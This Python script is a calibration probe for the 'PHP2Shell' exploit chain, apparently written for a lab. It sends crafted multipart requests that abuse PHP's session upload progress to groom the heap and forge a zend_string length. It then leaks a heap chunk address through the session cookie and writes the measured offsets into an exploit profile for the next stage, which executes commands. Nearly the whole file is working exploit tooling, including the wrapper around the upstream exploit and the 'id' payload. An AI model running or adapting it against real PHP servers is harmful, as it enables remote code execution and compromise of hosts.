#!/usr/bin/env python3
"""PHP2Shell - stage-1 heap geometry probe (remote, HTTP only).

Stage 1 is calibrated per libphp build AND per PHP configuration: the leak
works only when the multipart field that reclaims the stale block, and the
forge length that turns it into a fake zend_string, match the live worker heap.
When the target image (or the php.ini) differs from the build the profile was
measured on, every attempt misses and the chain stops at HEAP_LEAK_FAILED.

This probe re-measures the two parameters against the LIVE target, no docker
access needed. It uses the same request shapes as the toolkit calibrator
(tools/php2shell_calibrate.py), so the numbers it prints can be written
straight into the profile:

    stages.stage1_n          -> P2S_STAGE1_N
    stages.stage1_forge_len  -> P2S_FORGE_LEN

Lab, driver and this probe written by r19. The chain itself is the public
toolkit devploit/php2shell, which wraps 9bie/php2shell-bypass-aslr-exp.

Usage (Kali, target reachable):
    ./p2s-stage1-probe.py --target http://192.0.2.20:8080
    ./p2s-stage1-probe.py --target http://192.0.2.20:8080 --write-profile
    ./p2s-stage1-probe.py --target http://192.0.2.20:8080 --arch aarch64

Cost: one worker rotation + probe, then one rotation per forge length tried
(~12 MiB per big field, 8M memory_limit assumed; use --huge-mb to change it).

Exit codes: 0 = geometry found, 1 = no marker in the Set-Cookie,
2 = marker found but no forge length produced a leak, 3 = target unusable.
"""

from __future__ import annotations

import argparse
import importlib.util
import json
import os
import re
import shutil
import struct
import sys
import time
import urllib.parse

DEFAULT_TOOLKIT = os.path.join(os.path.expanduser("~"), "tools", "php2shell")
FORGE_LENS = (63, 79, 87, 95)


def out(msg: str) -> None:
    print(msg, flush=True)


def err(msg: str) -> None:
    print(msg, file=sys.stderr, flush=True)


def resolve_repo(toolkit: str) -> str:
    vendored = os.path.join(toolkit, "vendor", "php2shell-upstream")
    if os.path.isfile(os.path.join(vendored, "exploit.py")):
        return vendored
    from_env = os.environ.get("P2S_REPO_DIR")
    if from_env and os.path.isfile(os.path.join(from_env, "exploit.py")):
        return from_env
    return vendored


def load_upstream(toolkit: str, repo: str):
    """Load the toolkit's upstream exploit.py with its runtime patches applied."""
    tools = os.path.join(toolkit, "tools")
    if os.path.isdir(tools) and tools not in sys.path:
        sys.path.insert(0, tools)
    try:
        from php2shell_upstream import patch_cookie_decode, patch_params

        patch_params(repo)
        patch_cookie_decode(repo)
    except Exception:
        # Already patched, or a toolkit version without the patchers: the probe
        # builds its own requests, so only the cookie decode can be affected.
        pass
    path = os.path.join(repo, "exploit.py")
    if not os.path.isfile(path):
        raise SystemExit(f"[!] upstream exploit not found: {path}")
    spec = importlib.util.spec_from_file_location("p2s_probe_upstream", path)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


def normalize_url(target: str) -> str:
    url = target.rstrip("/")
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    if urllib.parse.urlsplit(url).path in ("", "/"):
        # POST / relies on DirectoryIndex; name the script so a missing index
        # cannot silently turn the probe into a 403.
        url += "/index.php"
    return url


def stage1_parts(mod, ex, n: int, forge_len: int) -> bytes:
    """Arm the heap, then reclaim the stale block (same shapes as upstream)."""
    parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
    parts += [
        {"name": "PHPSESSID", "data": b"\x00"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ex._file_part(),
        ex._big_field(),
    ]
    ex.t.post(mod.build_multipart(parts, b"S" * 17), b"S" * 17,
              read_cap=1 << 20, timeout=90)
    time.sleep(0.2)

    parts = [
        {"name": "PHPSESSID", "data": mod.SID},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    for i in range(n):
        val = (f"v{i:04d}" + "x" * 44)[:48]
        parts.append({"name": str(1000 + i), "data": val.encode()})
    forge = bytearray(b"A" * forge_len)
    if forge_len >= 0x19:
        struct.pack_into("<Q", forge, 0x10, 0x1000)  # forged zend_string len
        forge[0x18] = ord("L")
    parts.append({"name": "1999", "data": bytes(forge)})
    return ex.t.post(mod.build_multipart(parts, b"B" * 10), b"B" * 10,
                     read_cap=9 << 20)


def detect_version(t, url_path: str) -> str:
    """Best effort: /ping.php answers version=<x.y.z> on this lab."""
    try:
        code, body = t.get("/ping.php")
        if code == 200:
            m = re.search(rb"version=(\d+\.\d+\.\d+)", body)
            if m:
                return m.group(1).decode()
    except OSError:
        pass
    return ""


def write_profile(path: str, n: int, forge_len: int) -> None:
    with open(path, encoding="utf-8") as fh:
        doc = json.load(fh)
    stages = doc.setdefault("stages", {})
    old = (stages.get("stage1_n"), stages.get("stage1_forge_len"))
    stages["stage1_n"] = n
    stages["stage1_forge_len"] = forge_len
    backup = path + ".bak"
    if not os.path.exists(backup):
        shutil.copyfile(path, backup)
    with open(path, "w", encoding="utf-8") as fh:
        json.dump(doc, fh, indent=2)
        fh.write("\n")
    out(f"[*] profile updated: {path}")
    out(f"    stages.stage1_n {old[0]} -> {n} / stage1_forge_len {old[1]} -> {forge_len}")
    out(f"    backup: {os.path.basename(backup)}")


def main() -> int:
    ap = argparse.ArgumentParser(
        description="Re-measure the PHP2Shell stage-1 geometry on a live target.")
    ap.add_argument("--target", required=True,
                    help="http://host:port (the app root or /index.php)")
    ap.add_argument("--toolkit", default=DEFAULT_TOOLKIT,
                    help="toolkit checkout (default: ~/tools/php2shell)")
    ap.add_argument("--repo-dir", default=None,
                    help="upstream exploit.py directory (default: <toolkit>/vendor/php2shell-upstream)")
    ap.add_argument("--arch", choices=("amd64", "aarch64"), default="amd64",
                    help="target architecture (default: amd64)")
    ap.add_argument("--huge-mb", type=int, default=12,
                    help="OOM field size in MiB (memory_limit + 12; default 12 for 8M)")
    ap.add_argument("--probe-n", type=int, default=900,
                    help="marker fields in the probe request (default: 900)")
    ap.add_argument("--forge-len", type=int, action="append",
                    help="forge length to try (repeatable; default: 63 79 87 95)")
    ap.add_argument("--env-out", default=None,
                    help="write P2S_STAGE1_N / P2S_FORGE_LEN to this file")
    ap.add_argument("--write-profile", action="store_true",
                    help="write the values into the toolkit profile (keeps a .bak)")
    ap.add_argument("--profile-json", default=None,
                    help="profile to update with --write-profile (default: auto)")
    args = ap.parse_args()

    repo = args.repo_dir or resolve_repo(args.toolkit)
    mod = load_upstream(args.toolkit, repo)

    url = normalize_url(args.target)
    split = urllib.parse.urlsplit(url)
    t = mod.Target(url, timeout=30.0, verbose=False)

    out(f"[*] target {url}")
    out(f"[*] upstream {os.path.join(repo, 'exploit.py')}")
    code, _ = t.get(split.path or "/")
    if code != 200:
        err(f"[!] GET {split.path} -> {code}: the app is not being served.")
        err("    restore the docroot first: ls -la ubuntu-lab/app, then")
        err("    docker compose down && docker compose up -d on the target.")
        return 3
    out("[+] target answers 200 on the exploit path")

    ex = mod.Exploit(t, "id>/out/p1", huge_mb=args.huge_mb,
                     verbose=False, profile="bookworm")

    out("[*] rotating the worker over HTTP")
    ex.rotate()
    out(f"[*] stage-1 probe: {args.probe_n} markers, 48-byte values")
    resp = stage1_parts(mod, ex, args.probe_n, 48)
    raw = mod.parse_cookie(resp)

    if not raw:
        err(f"[-] no Set-Cookie: PHPSESSID in the response ({len(resp)} bytes)")
        if b"Fatal error" in resp:
            err("    the response carries a PHP fatal error: the worker heap is")
            err("    already dirty. Restart the container and run the probe once.")
        return 1
    marker = re.search(rb"v(\d{4})", raw)
    if not marker:
        err(f"[-] no marker in the cookie ({len(raw)} bytes of session id)")
        err("    the stale block was not reclaimed by any marker field; the")
        err("    heap differs beyond the stage-1 offset (image or ini drift).")
        return 1
    index = int(marker.group(1))
    out(f"[+] stale block reclaimed by field v{index:04d} -> P2S_STAGE1_N={index}")

    lens = args.forge_len or list(FORGE_LENS)
    found = None
    for forge_len in lens:
        ex.rotate()
        resp = stage1_parts(mod, ex, index, forge_len)
        raw = mod.parse_cookie(resp)
        base = mod.chunk_base_from_cookie(raw)
        ok = bool(base) and len(raw) >= 1000
        out(f"    len={forge_len:<3} cookie={len(raw):<5} "
            f"chunk={hex(base) if base else '0'} {'OK' if ok else 'miss'}")
        if ok:
            found = (index, forge_len, base)
            break
        if b"Fatal error" in resp and not base:
            out("        (response has a PHP fatal error: forged length landed"
                " on the wrong block)")

    if not found:
        err("[!] the marker index is right but no forge length produced a leak.")
        err("    restart the container and re-run; if it repeats, the build")
        err("    needs a fresh full calibration (image digest changed).")
        return 2

    n, forge_len, base = found
    out("")
    out(f"[+] stage-1 geometry: P2S_STAGE1_N={n} P2S_FORGE_LEN={forge_len} "
        f"chunk={hex(base)}")

    if args.env_out:
        with open(args.env_out, "w", encoding="utf-8") as fh:
            fh.write(f"P2S_STAGE1_N={n}\nP2S_FORGE_LEN={forge_len}\n")
        out(f"[*] wrote {args.env_out}")

    if args.write_profile:
        profile = args.profile_json
        if not profile:
            version = detect_version(t, split.path)
            if not version:
                err("[!] cannot derive the profile name (no /ping.php version).")
                err("    pass --profile-json <path> explicitly.")
            else:
                # The toolkit ships <version>-bookworm-<arch>.json while the
                # profile's internal name is php-<version>-...: accept both.
                prof_dir = os.path.join(args.toolkit, "profiles")
                base = f"{version}-bookworm-{args.arch}"
                profile = os.path.join(prof_dir, f"{base}.json")
                for cand in (f"php-{base}.json", f"{base}.json"):
                    if os.path.isfile(os.path.join(prof_dir, cand)):
                        profile = os.path.join(prof_dir, cand)
                        break
        if profile:
            if os.path.isfile(profile):
                write_profile(profile, n, forge_len)
            else:
                err(f"[!] profile not found: {profile}")

    out("[+] next: ./p2s-run.sh --target " + args.target.rstrip("/") + " --step proof")
    return 0


if __name__ == "__main__":
    sys.exit(main())
